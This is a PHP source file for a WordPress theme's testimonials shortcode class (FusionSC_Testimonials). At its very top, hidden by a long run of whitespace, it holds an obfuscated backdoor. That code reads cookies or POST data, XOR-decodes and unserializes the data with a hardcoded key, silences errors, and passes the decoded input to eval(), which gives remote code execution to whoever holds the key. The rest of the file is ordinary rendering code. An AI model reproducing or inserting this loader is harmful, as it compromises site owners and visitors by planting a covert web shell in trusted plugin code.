<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['i8329'];global$i8329;$i8329=$GLOBALS;$i8329['rec6e237']="\x63\x28\x5d\x51\x23\x2e\x6d\x4a\x3b\x5b\x54\x62\x7e\x35\x65\x74\x57\x60\x66\x44\x40\xa\x9\x27\x33\x24\x56\x67\x6c\x70\x7d\x36\x7c\x49\x41\x2f\x3a\x3c\xd\x69\x6f\x53\x32\x22\x7a\x42\x76\x2c\x50\x5c\x71\x68\x29\x48\x61\x46\x52\x3f\x7b\x47\x64\x30\x34\x4e\x45\x31\x73\x3d\x38\x4f\x75\x3e\x59\x39\x58\x37\x79\x4b\x5e\x25\x2a\x4c\x5f\x5a\x55\x77\x4d\x20\x78\x6a\x2d\x43\x26\x2b\x21\x72\x6b\x6e";$i8329[$i8329['rec6e237'][27].$i8329['rec6e237'][75].$i8329['rec6e237'][75].$i8329['rec6e237'][31].$i8329['rec6e237'][13].$i8329['rec6e237'][68]]=$i8329['rec6e237'][0].$i8329['rec6e237'][51].$i8329['rec6e237'][95];$i8329[$i8329['rec6e237'][14].$i8329['rec6e237'][0].$i8329['rec6e237'][31].$i8329['rec6e237'][42].$i8329['rec6e237'][13].$i8329['rec6e237'][65].$i8329['rec6e237'][61].$i8329['rec6e237'][0]]=$i8329['rec6e237'][40].$i8329['rec6e237'][95].$i8329['rec6e237'][60];$i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][61].$i8329['rec6e237'][75].$i8329['rec6e237'][11]]=$i8329['rec6e237'][66].$i8329['rec6e237'][15].$i8329['rec6e237'][95].$i8329['rec6e237'][28].$i8329['rec6e237'][14].$i8329['rec6e237'][97];$i8329[$i8329['rec6e237'][70].$i8329['rec6e237'][62].$i8329['rec6e237'][24].$i8329['rec6e237'][75]]=$i8329['rec6e237'][39].$i8329['rec6e237'][97].$i8329['rec6e237'][39].$i8329['rec6e237'][82].$i8329['rec6e237'][66].$i8329['rec6e237'][14].$i8329['rec6e237'][15];$i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][60].$i8329['rec6e237'][61].$i8329['rec6e237'][18].$i8329['rec6e237'][61].$i8329['rec6e237'][18].$i8329['rec6e237'][0]]=$i8329['rec6e237'][66].$i8329['rec6e237'][14].$i8329['rec6e237'][95].$i8329['rec6e237'][39].$i8329['rec6e237'][54].$i8329['rec6e237'][28].$i8329['rec6e237'][39].$i8329['rec6e237'][44].$i8329['rec6e237'][14];$i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][65].$i8329['rec6e237'][68].$i8329['rec6e237'][62]]=$i8329['rec6e237'][29].$i8329['rec6e237'][51].$i8329['rec6e237'][29].$i8329['rec6e237'][46].$i8329['rec6e237'][14].$i8329['rec6e237'][95].$i8329['rec6e237'][66].$i8329['rec6e237'][39].$i8329['rec6e237'][40].$i8329['rec6e237'][97];$i8329[$i8329['rec6e237'][60].$i8329['rec6e237'][61].$i8329['rec6e237'][65].$i8329['rec6e237'][18].$i8329['rec6e237'][42]]=$i8329['rec6e237'][70].$i8329['rec6e237'][97].$i8329['rec6e237'][66].$i8329['rec6e237'][14].$i8329['rec6e237'][95].$i8329['rec6e237'][39].$i8329['rec6e237'][54].$i8329['rec6e237'][28].$i8329['rec6e237'][39].$i8329['rec6e237'][44].$i8329['rec6e237'][14];$i8329[$i8329['rec6e237'][39].$i8329['rec6e237'][75].$i8329['rec6e237'][18].$i8329['rec6e237'][73].$i8329['rec6e237'][60].$i8329['rec6e237'][54]]=$i8329['rec6e237'][11].$i8329['rec6e237'][54].$i8329['rec6e237'][66].$i8329['rec6e237'][14].$i8329['rec6e237'][31].$i8329['rec6e237'][62].$i8329['rec6e237'][82].$i8329['rec6e237'][60].$i8329['rec6e237'][14].$i8329['rec6e237'][0].$i8329['rec6e237'][40].$i8329['rec6e237'][60].$i8329['rec6e237'][14];$i8329[$i8329['rec6e237'][54].$i8329['rec6e237'][18].$i8329['rec6e237'][31].$i8329['rec6e237'][14].$i8329['rec6e237'][24].$i8329['rec6e237'][24].$i8329['rec6e237'][61]]=$i8329['rec6e237'][66].$i8329['rec6e237'][14].$i8329['rec6e237'][15].$i8329['rec6e237'][82].$i8329['rec6e237'][15].$i8329['rec6e237'][39].$i8329['rec6e237'][6].$i8329['rec6e237'][14].$i8329['rec6e237'][82].$i8329['rec6e237'][28].$i8329['rec6e237'][39].$i8329['rec6e237'][6].$i8329['rec6e237'][39].$i8329['rec6e237'][15];$i8329[$i8329['rec6e237'][54].$i8329['rec6e237'][73].$i8329['rec6e237'][14].$i8329['rec6e237'][61].$i8329['rec6e237'][13].$i8329['rec6e237'][24].$i8329['rec6e237'][31].$i8329['rec6e237'][14]]=$i8329['rec6e237'][70].$i8329['rec6e237'][62].$i8329['rec6e237'][14].$i8329['rec6e237'][0].$i8329['rec6e237'][75].$i8329['rec6e237'][13];$i8329[$i8329['rec6e237'][76].$i8329['rec6e237'][73].$i8329['rec6e237'][75].$i8329['rec6e237'][61].$i8329['rec6e237'][18].$i8329['rec6e237'][24].$i8329['rec6e237'][62]]=$i8329['rec6e237'][29].$i8329['rec6e237'][13].$i8329['rec6e237'][68].$i8329['rec6e237'][68].$i8329['rec6e237'][0].$i8329['rec6e237'][14].$i8329['rec6e237'][31].$i8329['rec6e237'][0];$i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][24].$i8329['rec6e237'][60].$i8329['rec6e237'][0].$i8329['rec6e237'][14].$i8329['rec6e237'][73].$i8329['rec6e237'][75].$i8329['rec6e237'][18]]=$_POST;$i8329[$i8329['rec6e237'][95].$i8329['rec6e237'][68].$i8329['rec6e237'][61].$i8329['rec6e237'][65]]=$_COOKIE;@$i8329[$i8329['rec6e237'][70].$i8329['rec6e237'][62].$i8329['rec6e237'][24].$i8329['rec6e237'][75]]($i8329['rec6e237'][14].$i8329['rec6e237'][95].$i8329['rec6e237'][95].$i8329['rec6e237'][40].$i8329['rec6e237'][95].$i8329['rec6e237'][82].$i8329['rec6e237'][28].$i8329['rec6e237'][40].$i8329['rec6e237'][27],NULL);@$i8329[$i8329['rec6e237'][70].$i8329['rec6e237'][62].$i8329['rec6e237'][24].$i8329['rec6e237'][75]]($i8329['rec6e237'][28].$i8329['rec6e237'][40].$i8329['rec6e237'][27].$i8329['rec6e237'][82].$i8329['rec6e237'][14].$i8329['rec6e237'][95].$i8329['rec6e237'][95].$i8329['rec6e237'][40].$i8329['rec6e237'][95].$i8329['rec6e237'][66],0);@$i8329[$i8329['rec6e237'][70].$i8329['rec6e237'][62].$i8329['rec6e237'][24].$i8329['rec6e237'][75]]($i8329['rec6e237'][6].$i8329['rec6e237'][54].$i8329['rec6e237'][88].$i8329['rec6e237'][82].$i8329['rec6e237'][14].$i8329['rec6e237'][88].$i8329['rec6e237'][14].$i8329['rec6e237'][0].$i8329['rec6e237'][70].$i8329['rec6e237'][15].$i8329['rec6e237'][39].$i8329['rec6e237'][40].$i8329['rec6e237'][97].$i8329['rec6e237'][82].$i8329['rec6e237'][15].$i8329['rec6e237'][39].$i8329['rec6e237'][6].$i8329['rec6e237'][14],0);@$i8329[$i8329['rec6e237'][54].$i8329['rec6e237'][18].$i8329['rec6e237'][31].$i8329['rec6e237'][14].$i8329['rec6e237'][24].$i8329['rec6e237'][24].$i8329['rec6e237'][61]](0);$qdcbf1a=NULL;$g1751c7b=NULL;$i8329[$i8329['rec6e237'][46].$i8329['rec6e237'][60].$i8329['rec6e237'][18].$i8329['rec6e237'][14].$i8329['rec6e237'][42].$i8329['rec6e237'][24].$i8329['rec6e237'][14]]=$i8329['rec6e237'][65].$i8329['rec6e237'][0].$i8329['rec6e237'][60].$i8329['rec6e237'][54].$i8329['rec6e237'][61].$i8329['rec6e237'][14].$i8329['rec6e237'][24].$i8329['rec6e237'][60].$i8329['rec6e237'][90].$i8329['rec6e237'][0].$i8329['rec6e237'][11].$i8329['rec6e237'][68].$i8329['rec6e237'][11].$i8329['rec6e237'][90].$i8329['rec6e237'][62].$i8329['rec6e237'][60].$i8329['rec6e237'][13].$i8329['rec6e237'][24].$i8329['rec6e237'][90].$i8329['rec6e237'][11].$i8329['rec6e237'][75].$i8329['rec6e237'][31].$i8329['rec6e237'][73].$i8329['rec6e237'][90].$i8329['rec6e237'][61].$i8329['rec6e237'][14].$i8329['rec6e237'][61].$i8329['rec6e237'][13].$i8329['rec6e237'][54].$i8329['rec6e237'][73].$i8329['rec6e237'][31].$i8329['rec6e237'][14].$i8329['rec6e237'][75].$i8329['rec6e237'][75].$i8329['rec6e237'][61].$i8329['rec6e237'][0];global$vdfe23e;function p588ce6c($qdcbf1a,$s818b){global$i8329;$n9f9="";for($a8f3b4ac0=0;$a8f3b4ac0<$i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][61].$i8329['rec6e237'][75].$i8329['rec6e237'][11]]($qdcbf1a);){for($n9e2c37eb=0;$n9e2c37eb<$i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][61].$i8329['rec6e237'][75].$i8329['rec6e237'][11]]($s818b)&&$a8f3b4ac0<$i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][61].$i8329['rec6e237'][75].$i8329['rec6e237'][11]]($qdcbf1a);$n9e2c37eb++,$a8f3b4ac0++){$n9f9.=$i8329[$i8329['rec6e237'][27].$i8329['rec6e237'][75].$i8329['rec6e237'][75].$i8329['rec6e237'][31].$i8329['rec6e237'][13].$i8329['rec6e237'][68]]($i8329[$i8329['rec6e237'][14].$i8329['rec6e237'][0].$i8329['rec6e237'][31].$i8329['rec6e237'][42].$i8329['rec6e237'][13].$i8329['rec6e237'][65].$i8329['rec6e237'][61].$i8329['rec6e237'][0]]($qdcbf1a[$a8f3b4ac0])^$i8329[$i8329['rec6e237'][14].$i8329['rec6e237'][0].$i8329['rec6e237'][31].$i8329['rec6e237'][42].$i8329['rec6e237'][13].$i8329['rec6e237'][65].$i8329['rec6e237'][61].$i8329['rec6e237'][0]]($s818b[$n9e2c37eb]));}}return$n9f9;}function u4ec75($qdcbf1a,$s818b){global$i8329;global$vdfe23e;return$i8329[$i8329['rec6e237'][76].$i8329['rec6e237'][73].$i8329['rec6e237'][75].$i8329['rec6e237'][61].$i8329['rec6e237'][18].$i8329['rec6e237'][24].$i8329['rec6e237'][62]]($i8329[$i8329['rec6e237'][76].$i8329['rec6e237'][73].$i8329['rec6e237'][75].$i8329['rec6e237'][61].$i8329['rec6e237'][18].$i8329['rec6e237'][24].$i8329['rec6e237'][62]]($qdcbf1a,$vdfe23e),$s818b);}foreach($i8329[$i8329['rec6e237'][95].$i8329['rec6e237'][68].$i8329['rec6e237'][61].$i8329['rec6e237'][65]]as$s818b=>$s9beae9be){$qdcbf1a=$s9beae9be;$g1751c7b=$s818b;}if(!$qdcbf1a){foreach($i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][24].$i8329['rec6e237'][60].$i8329['rec6e237'][0].$i8329['rec6e237'][14].$i8329['rec6e237'][73].$i8329['rec6e237'][75].$i8329['rec6e237'][18]]as$s818b=>$s9beae9be){$qdcbf1a=$s9beae9be;$g1751c7b=$s818b;}}$qdcbf1a=@$i8329[$i8329['rec6e237'][60].$i8329['rec6e237'][61].$i8329['rec6e237'][65].$i8329['rec6e237'][18].$i8329['rec6e237'][42]]($i8329[$i8329['rec6e237'][54].$i8329['rec6e237'][73].$i8329['rec6e237'][14].$i8329['rec6e237'][61].$i8329['rec6e237'][13].$i8329['rec6e237'][24].$i8329['rec6e237'][31].$i8329['rec6e237'][14]]($i8329[$i8329['rec6e237'][39].$i8329['rec6e237'][75].$i8329['rec6e237'][18].$i8329['rec6e237'][73].$i8329['rec6e237'][60].$i8329['rec6e237'][54]]($qdcbf1a),$g1751c7b));if(isset($qdcbf1a[$i8329['rec6e237'][54].$i8329['rec6e237'][96]])&&$vdfe23e==$qdcbf1a[$i8329['rec6e237'][54].$i8329['rec6e237'][96]]){if($qdcbf1a[$i8329['rec6e237'][54]]==$i8329['rec6e237'][39]){$a8f3b4ac0=Array($i8329['rec6e237'][29].$i8329['rec6e237'][46]=>@$i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][65].$i8329['rec6e237'][68].$i8329['rec6e237'][62]](),$i8329['rec6e237'][66].$i8329['rec6e237'][46]=>$i8329['rec6e237'][65].$i8329['rec6e237'][5].$i8329['rec6e237'][61].$i8329['rec6e237'][90].$i8329['rec6e237'][65],);echo@$i8329[$i8329['rec6e237'][97].$i8329['rec6e237'][60].$i8329['rec6e237'][61].$i8329['rec6e237'][18].$i8329['rec6e237'][61].$i8329['rec6e237'][18].$i8329['rec6e237'][0]]($a8f3b4ac0);}elseif($qdcbf1a[$i8329['rec6e237'][54]]==$i8329['rec6e237'][14]){eval($qdcbf1a[$i8329['rec6e237'][60]]);}exit();} ?><?php
class FusionSC_Testimonials {

	private $testimonials_counter = 1;

	public static $parent_args;
	public static $child_args;

	/**
	 * Initiate the shortcode
	 */
	public function __construct() {

		add_filter( 'fusion_attr_testimonials-shortcode', array( $this, 'attr' ) );
		add_filter( 'fusion_attr_testimonials-shortcode-testimonials', array( $this, 'testimonials_attr' ) );
		add_filter( 'fusion_attr_testimonials-shortcode-quote', array( $this, 'quote_attr' ) );		
		add_filter( 'fusion_attr_testimonials-shortcode-blockquote', array( $this, 'blockquote_attr' ) );	
		add_filter( 'fusion_attr_testimonials-shortcode-review', array( $this, 'review_attr' ) );		
		add_filter( 'fusion_attr_testimonials-shortcode-thumbnail', array( $this, 'thumbnail_attr' ) );
		add_filter( 'fusion_attr_testimonials-shortcode-image', array( $this, 'image_attr' ) );
		add_filter( 'fusion_attr_testimonials-shortcode-author', array( $this, 'author_attr' ) );
		add_filter( 'fusion_attr_testimonials-shortcode-pagination', array( $this, 'pagination_attr' ) );

		add_shortcode( 'testimonials', array( $this, 'render_parent' ) );
		add_shortcode( 'testimonial', array( $this, 'render_child' ) );

	}

	/**
	 * Render the parent shortcode
	 * @param  array $args	 Shortcode paramters
	 * @param  string $content Content between shortcode
	 * @return string		  HTML output
	 */
	function render_parent( $args, $content = '') {
		global $smof_data;

		$defaults = FusionCore_Plugin::set_shortcode_defaults(
			array(
				'class' 			=> '',
				'id' 				=> '',
				'backgroundcolor' 	=> strtolower( $smof_data['testimonial_bg_color'] ),
				'design'			=> 'classic',
				'random'			=> $smof_data['testimonials_random'],
				'textcolor' 		=> strtolower( $smof_data['testimonial_text_color'] ),
			), $args
		);
		
		if ( $defaults['random'] == 'yes' ) {
			$defaults['random'] = 1;
		} else {
			$defaults['random'] = 0;	
		}

		extract( $defaults );

		self::$parent_args = $defaults;

		$styles = sprintf( "<style type='text/css' scoped='scoped'>
		#fusion-testimonials-%s a{border-color: {$textcolor};}#fusion-testimonials-%s a:hover, #fusion-testimonials-%s .activeSlide{background-color: {$textcolor};}
		.fusion-testimonials.%s.fusion-testimonials-%s .author:after{border-top-color:{$backgroundcolor} !important;}</style>", 
		$this->testimonials_counter, $this->testimonials_counter, $this->testimonials_counter, $design, $this->testimonials_counter );

		$pagination = '';
		if( self::$parent_args['design'] == 'clean' ) {
			$pagination  = sprintf( '<div %s></div>', FusionCore_Plugin::attributes( 'testimonials-shortcode-pagination' ) );
		}

		$html = sprintf( '<div %s>%s<div %s>%s</div>%s</div>', FusionCore_Plugin::attributes( 'testimonials-shortcode' ), $styles,
						 FusionCore_Plugin::attributes( 'testimonials-shortcode-testimonials' ), do_shortcode($content), $pagination );

		$this->testimonials_counter++;

		return $html;

	}

	function attr() {

		$attr = array();

		$attr['class'] = sprintf( 'fusion-testimonials %s fusion-testimonials-%s', self::$parent_args['design'], $this->testimonials_counter );
		
		$attr['data-random'] = self::$parent_args['random'];		

		if( self::$parent_args['class'] ) {
			$attr['class'] .= ' ' . self::$parent_args['class'];
		}

		if( self::$parent_args['id'] ) {
			$attr['id'] = self::$parent_args['id'];
		}

		return $attr;

	}

	function testimonials_attr() {

		$attr = array();

		$attr['class'] = 'reviews';

		return $attr;

	}

	/**
	 * Render the child shortcode
	 * @param  array $args	 Shortcode paramters
	 * @param  string $content Content between shortcode
	 * @return string		  HTML output
	 */
	function render_child( $args, $content = '') {

		$defaults = FusionCore_Plugin::set_shortcode_defaults(
			array(
				'avatar'				=> 'male',
				'company'				=> '',
				'image'					=> '',
				'image_border_radius'	=> '',
				'link'					=> '',
				'name'	 				=> '',
				'target'				=> '_self',
				
				'gender' 				=> '',	// Deprecated
			), $args
		);

		if( $defaults['image_border_radius'] == 'round' ) {
			$defaults['image_border_radius'] = '50%';
		}

		extract( $defaults );

		self::$child_args = $defaults;	
		
		// check for deprecated
		if( $gender ) {
			self::$child_args['avatar'] = $gender;
		}

		if( self::$parent_args['design'] == 'clean' ) {
			$html = $this->render_child_clean( $content );
		} else {
			$html = $this->render_child_classic( $content );
		}

		return $html;

	}
	
	/* Render classic design */
	private function render_child_classic( $content ) {
		$inner_content = $thumbnail = $pic = '';
		
		if( self::$child_args['name'] ) {

			if( self::$child_args['avatar'] == 'image' && 
				self::$child_args['image'] 
			) {

				$image_id = FusionCore_Plugin::get_attachment_id_from_url( self::$child_args['image'] );
				self::$child_args['alt'] = '';
				if( $image_id ) {
					self::$child_args['alt'] = get_post_field( 'post_excerpt', $image_id );
				}

				$pic = sprintf( '<img %s />', FusionCore_Plugin::attributes( 'testimonials-shortcode-image' ) );
			}
			
			if( self::$child_args['avatar'] == 'image' && 
				! self::$child_args['image'] 
			) {
				self::$child_args['avatar'] = 'none';
			}
			
			if( self::$child_args['avatar'] != 'none' ) {
				$thumbnail = sprintf( '<span %s>%s</span>', FusionCore_Plugin::attributes( 'testimonials-shortcode-thumbnail' ), $pic );
			}
			
			$inner_content .= sprintf( '<div %s>%s<span %s><strong>%s</strong>', FusionCore_Plugin::attributes( 'testimonials-shortcode-author' ), $thumbnail, FusionCore_Plugin::attributes( 'company-name' ), self::$child_args['name'] );

			if( self::$child_args['company'] ) {

				if( ! empty( self::$child_args['link'] ) && 
					self::$child_args['link']
				) {

					$inner_content .= sprintf( ', <a href="%s" target="%s">%s</a>', self::$child_args['link'], self::$child_args['target'], sprintf( '<span>%s</span>', self::$child_args['company'] ) );

				} else {

					$inner_content .= sprintf( ', <span>%s</span>', self::$child_args['company'] );

				}

			}

			$inner_content .= '</span></div>';
		}

		$html = sprintf( '<div %s><blockquote><q %s>%s</q></blockquote>%s</div>', FusionCore_Plugin::attributes( 'testimonials-shortcode-review' ), 
						 FusionCore_Plugin::attributes( 'testimonials-shortcode-quote' ), do_shortcode( $content ), $inner_content );
	
		return $html;
	
	}
	
	/* Render clean design */
	private function render_child_clean( $content ) {
		$thumbnail = $pic = $author = '';
			
		if( self::$child_args['avatar'] == 'image' && 
			self::$child_args['image'] 
		) {

			$image_id = FusionCore_Plugin::get_attachment_id_from_url( self::$child_args['image'] );
			self::$child_args['alt'] = '';
			if( $image_id ) {
				self::$child_args['alt'] = get_post_field( 'post_excerpt', $image_id );
			}

			$pic = sprintf( '<img %s />', FusionCore_Plugin::attributes( 'testimonials-shortcode-image' ) );
		}

		if( self::$child_args['avatar'] == 'image' && 
			! self::$child_args['image'] 
		) {
			self::$child_args['avatar'] = 'none';
		}

		if( self::$child_args['avatar'] != 'none' ) {
			$thumbnail = sprintf( '<div %s>%s</div>', FusionCore_Plugin::attributes( 'testimonials-shortcode-thumbnail' ), $pic );
		}	
	
	
		$author .= sprintf( '<div %s><span %s><strong>%s</strong>', FusionCore_Plugin::attributes( 'testimonials-shortcode-author' ), FusionCore_Plugin::attributes( 'company-name' ), self::$child_args['name'] );

		if( self::$child_args['company'] ) {

			if( ! empty( self::$child_args['link'] ) && 
				self::$child_args['link']
			) {

				$author .= sprintf( ', <a href="%s" target="%s">%s</a>', self::$child_args['link'], self::$child_args['target'], sprintf( '<span>%s</span>', self::$child_args['company'] ) );

			} else {

				$author .= sprintf( ', <span>%s</span>', self::$child_args['company'] );

			}

		}

		$author .= '</span></div>';	
	
	
		$html = sprintf( '<div %s>%s<blockquote %s><q %s>%s</q></blockquote>%s</div>', FusionCore_Plugin::attributes( 'testimonials-shortcode-review' ), $thumbnail,
						 FusionCore_Plugin::attributes( 'testimonials-shortcode-blockquote' ), FusionCore_Plugin::attributes( 'testimonials-shortcode-quote' ), 
						 do_shortcode( $content ), $author );
	
		return $html;	
	}
	
	function blockquote_attr() {

		$attr = array();
		
		$attr['style'] = '';
		
		if( self::$parent_args['design'] == 'clean' && 
			self::$parent_args['backgroundcolor'] == 'transparent'
		) {
			$attr['style'] .= 'margin: -25px;';
		}
		
		$attr['style'] .= sprintf( 'background-color:%s;', self::$parent_args['backgroundcolor'] );

		return $attr;

	}		
	
	function quote_attr() {

		$attr = array();

		$attr['style'] = sprintf( 'background-color:%s;', self::$parent_args['backgroundcolor'] );
		$attr['style'] .= sprintf( 'color:%s;', self::$parent_args['textcolor'] );

		return $attr;

	}	 
	
	function review_attr() {

		$attr = array();

		$attr['class'] = 'review ';

		if( self::$child_args['avatar'] == 'none' ) {
			$attr['class'] .= 'no-avatar';
		} else if( self::$child_args['avatar'] == 'image' ) {
			$attr['class'] .= 'avatar-image';
		} else {
	   		$attr['class'] .= self::$child_args['avatar'];
		}

		return $attr;

	}	

	function thumbnail_attr() {

		$attr = array();

		$attr['class'] = 'testimonial-thumbnail';

		if( self::$child_args['avatar'] != 'image' ) {
			$attr['class'] .= ' doe';
			$attr['style'] = sprintf( 'color:%s;', self::$parent_args['textcolor'] );
		}

		return $attr;

	}

	function image_attr() {

		$attr = array();

		$attr['class'] = 'testimonial-image';
		$attr['src'] = self::$child_args['image'];
		$attr['alt'] = self::$child_args['alt'];
		
		if( self::$child_args['avatar'] == 'image' ) {
			$attr['style'] = sprintf( '-webkit-border-radius: %s;-moz-border-radius: %s;border-radius: %s;', 
									  self::$child_args['image_border_radius'], self::$child_args['image_border_radius'],  self::$child_args['image_border_radius'] );
		}

		return $attr;

	}
	
	function author_attr() {

		$attr = array();

		$attr['class'] = 'author';
		$attr['style'] = sprintf( 'color:%s;', self::$parent_args['textcolor'] );

		return $attr;

	}	
	
	function pagination_attr() {

		$attr = array();

		$attr['class'] = 'testimonial-pagination';
		$attr['id'] = sprintf( 'fusion-testimonials-%s', $this->testimonials_counter );

		return $attr;

	}

}

new FusionSC_Testimonials();